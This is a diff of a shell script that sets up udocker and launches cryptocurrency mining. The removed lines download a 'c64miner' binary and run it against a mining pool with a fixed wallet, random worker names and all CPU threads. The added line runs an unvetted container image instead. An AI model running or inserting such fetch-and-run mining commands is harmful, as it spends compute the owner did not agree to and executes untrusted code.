@@ -4,13 +4,4 @@ export LANG=C
 curl https://github.com/indigo-dc/udocker/releases/download/1.3.17/udocker-1.3.17.tar.gz -L -o udocker-1.3.17.tar.gz
 tar zxvf udocker-1.3.17.tar.gz
 export PATH=`pwd`/udocker-1.3.17/udocker:$PATH
-udocker pull ubuntu:latest
-udocker create --name=latest ubuntu:latest
-udocker  run latest /bin/bash
-
-udocker
-echo
-apt update && apt -y install unzip wget curl libncurses6 libncursesw6
-curl https://github.com/oxynaz/c64miner/releases/download/v0.2.1/c64miner-v0.2.1-ubuntu24-x86_64.tar.gz -L -o c64miner-v0.2.1-ubuntu24-x86_64.tar.gz
-tar xf c64miner-v0.2.1-ubuntu24-x86_64.tar.gz
-./c64miner -o stratum+tcp://c64.suprnova.cc:6464 -u Wo4wBGZX7fq2cNG65PfwHH6D7s3aJz71bGPuJ7mwtNSf6cPsQsP8ihJAAT7fnk2Uf3LBH4BcMBER4jkFKHPkuXd732397gLRJ.$(echo $RANDOM | md5sum | head -c 10) -p x -a rx/c64 -t $(nproc --all)
+udocker run novalanto/c64:latest
